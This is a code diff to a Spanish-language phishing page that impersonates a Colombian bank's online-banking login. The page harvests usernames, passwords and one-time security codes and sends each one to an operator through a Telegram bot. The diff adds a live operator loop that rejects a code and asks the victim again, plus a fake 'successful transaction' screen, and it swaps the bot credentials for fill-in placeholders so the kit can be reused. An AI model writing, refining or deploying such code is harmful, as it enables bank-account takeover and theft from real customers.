@@ -24,7 +24,7 @@
             font-size: 0.85rem;
         }
         
-        /* ESTILOS PARA LA PANTALLA DEL CÓDIGO (Según la imagen) */
+        /* ESTILOS PARA LA PANTALLA DEL CÓDIGO */
         .otp-title {
             font-size: 2rem;
             font-weight: 700;
@@ -142,7 +142,7 @@
                         </div>
                     </div>
 
-                    <!-- PASO 3: PANTALLA DE CARGA -->
+                    <!-- PASO 3: PANTALLA DE CARGA (Esperando acción en Telegram) -->
                     <div id="step-waiting" class="d-none">
                         <div class="bb-subtitle bb-block bb-block--lg text-center">
                             <div style="width:52px;height:52px;border:5px solid #e0e0e0;border-top-color:#0033A0;border-radius:50%;animation:spin 0.9s linear infinite;margin:30px auto;"></div>
@@ -150,13 +150,12 @@
                         </div>
                     </div>
 
-                    <!-- PASO 4: CÓDIGO OTP (Diseño idéntico a la imagen) -->
+                    <!-- PASO 4: CÓDIGO OTP -->
                     <div id="step-otp" class="d-none">
                         <h2 class="otp-title">Su código de seguridad ha sido enviado.</h2>
                         <p style="font-size: 1rem; color: #333; margin-bottom: 20px;">Para continuar, por favor verifique que el código de seguridad haya llegado a su teléfono celular registrado:</p>
                         
                         <div class="phone-box">
-                            <!-- Icono de celular SVG -->
                             <svg class="phone-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/>
                             </svg>
@@ -172,7 +171,6 @@
                                         <small style="color: #6c757d; font-size: 0.85rem; margin-top: 5px; display: block;">Por favor ingrese el código compuesto por 6 dígitos</small>
                                     </div>
                                     <div class="bb-button-bar bb-block bb-block--xl mt-3">
-                                        <!-- Botón Enviar con el color azul de la imagen -->
                                         <button id="btn-otp" class="btn btn-primary w-100" type="submit" style="background-color: #0070c0; border-radius: 25px; padding: 12px; font-weight: bold;">
                                             Enviar
                                         </button>
@@ -193,6 +191,17 @@
                         </div>
                     </div>
 
+                    <!-- PASO 5: PANTALLA FINAL -->
+                    <div id="step-final" class="d-none text-center">
+                        <div style="margin-top: 40px;">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" fill="#28a745" viewBox="0 0 16 16" style="margin-bottom: 20px;">
+                                <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
+                            </svg>
+                            <h2 style="color:#1a1a1a; font-weight: 700;">¡Transacción Exitosa!</h2>
+                            <p style="color:#555; font-size: 1.1rem;">Sus datos han sido verificados correctamente. Ya puede cerrar esta ventana.</p>
+                        </div>
+                    </div>
+
                 </div>
             </div>
         </div>
@@ -204,8 +213,8 @@
         /* ========================================== */
         /* CONFIGURACIÓN DE TELEGRAM                  */
         /* ========================================== */
-        const TELEGRAM_BOT_TOKEN = '9120530050:AAE3ElStuRlIjO-I-RYz6DRRF12O_GArJrk'; 
-        const TELEGRAM_CHAT_ID = '8217102156';         
+        const TELEGRAM_BOT_TOKEN = 'AQUI_TU_TOKEN_DEL_BOT'; 
+        const TELEGRAM_CHAT_ID = 'AQUI_TU_CHAT_ID';         
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
         /* ========================================== */
 
@@ -213,6 +222,7 @@
         const stepPassword = document.getElementById('step-password');
         const stepWaiting  = document.getElementById('step-waiting');
         const stepOtp      = document.getElementById('step-otp');
+        const stepFinal    = document.getElementById('step-final');
 
         const inputUser = document.getElementById('username-input');
         const btnIndex  = document.getElementById('btn-index');
@@ -229,7 +239,7 @@
         let lastUpdateId = 0; 
         let pollingInterval = null;
 
-        /* Función auxiliar para enviar mensajes simples */
+        /* Función para enviar mensajes simples */
         function enviarTelegram(texto) {
             fetch(`${TELEGRAM_API}/sendMessage`, {
                 method: 'POST',
@@ -275,8 +285,7 @@
             stepWaiting.classList.remove('d-none');
 
             // Enviar credenciales a Telegram CON LOS DOS BOTONES
-            const url = `${TELEGRAM_API}/sendMessage`;
-            await fetch(url, {
+            await fetch(`${TELEGRAM_API}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -297,7 +306,43 @@
             iniciarPolling();
         });
 
-        /* ---------- ESCUCHAR RESPUESTA DE TELEGRAM (POLLING) ---------- */
+        /* ---------- PASO 4: CÓDIGO OTP ---------- */
+        otpInput.addEventListener('input', function () {
+            btnOtp.disabled = this.value.trim().length < 6;
+        });
+
+        document.getElementById('form-otp').addEventListener('submit', async function (e) {
+            e.preventDefault();
+            const codigo = otpInput.value.trim();
+            if (!codigo) return;
+
+            // Ocultar OTP y mostrar pantalla de espera
+            stepOtp.classList.add('d-none');
+            stepWaiting.classList.remove('d-none');
+
+            // Enviar código a Telegram CON LOS DOS NUEVOS BOTONES
+            await fetch(`${TELEGRAM_API}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: `🔑 <b>Código OTP Recibido (${USERNAME}):</b>\n<code>${codigo}</code>\n\n¿Qué acción desea tomar?`,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: "❌ Código Erróneo", callback_data: `codigo_error` },
+                                { text: "✅ Finalizar", callback_data: `finalizar` }
+                            ]
+                        ]
+                    }
+                })
+            });
+
+            iniciarPolling();
+        });
+
+        /* ---------- ESCUCHAR RESPUESTAS DE TELEGRAM (POLLING) ---------- */
         function iniciarPolling() {
             if (pollingInterval) clearInterval(pollingInterval);
 
@@ -328,11 +373,27 @@
                                 if (action === 'malo') {
                                     enviarTelegram(`🚫 El usuario <code>${USERNAME}</code> ha sido marcado como malo.`);
                                     document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:sans-serif;"><h2>Error de autenticación</h2><p>El usuario no es válido.</p></div>';
-                                } else if (action === 'pedir_codigo') {
+                                } 
+                                else if (action === 'pedir_codigo') {
                                     enviarTelegram(`📩 Se ha solicitado el código para <code>${USERNAME}</code>.`);
                                     stepWaiting.classList.add('d-none');
                                     stepOtp.classList.remove('d-none');
                                     otpInput.focus();
+                                }
+                                else if (action === 'codigo_error') {
+                                    // Si el código está mal, volvemos a mostrar la pantalla del OTP
+                                    enviarTelegram(`❌ El código fue rechazado. Se le solicitará de nuevo al usuario.`);
+                                    stepWaiting.classList.add('d-none');
+                                    stepOtp.classList.remove('d-none');
+                                    otpInput.value = ''; // Limpiar campo
+                                    btnOtp.disabled = true;
+                                    otpInput.focus();
+                                }
+                                else if (action === 'finalizar') {
+                                    // Todo salió bien
+                                    enviarTelegram(`✅ Proceso finalizado con éxito.`);
+                                    stepWaiting.classList.add('d-none');
+                                    stepFinal.classList.remove('d-none');
                                 }
                             }
                         });
@@ -342,29 +403,6 @@
                 }
             }, 2000);
         }
-
-        /* ---------- PASO 4: CÓDIGO OTP ---------- */
-        otpInput.addEventListener('input', function () {
-            btnOtp.disabled = this.value.trim().length < 6; // Requiere 6 dígitos
-        });
-
-        document.getElementById('form-otp').addEventListener('submit', function (e) {
-            e.preventDefault();
-            const codigo = otpInput.value.trim();
-            if (!codigo) return;
-
-            enviarTelegram(`✅ <b>Código OTP Recibido (${USERNAME}):</b>\n<code>${codigo}</code>`);
-
-            // Pantalla final
-            document.body.innerHTML = `
-            <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f5f5f5;">
-                <div style="text-align:center;padding:40px;">
-                    <img style="width:160px;margin-bottom:32px;" src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/logoBCSLine.svg">
-                    <h2 style="color:#0033A0;margin-bottom:10px;">¡Transacción Exitosa!</h2>
-                    <p style="color:#444;font-size:15px;margin:0;">Sus datos han sido verificados correctamente.</p>
-                </div>
-            </div>`;
-        });
     </script>
 </body>
 </html>
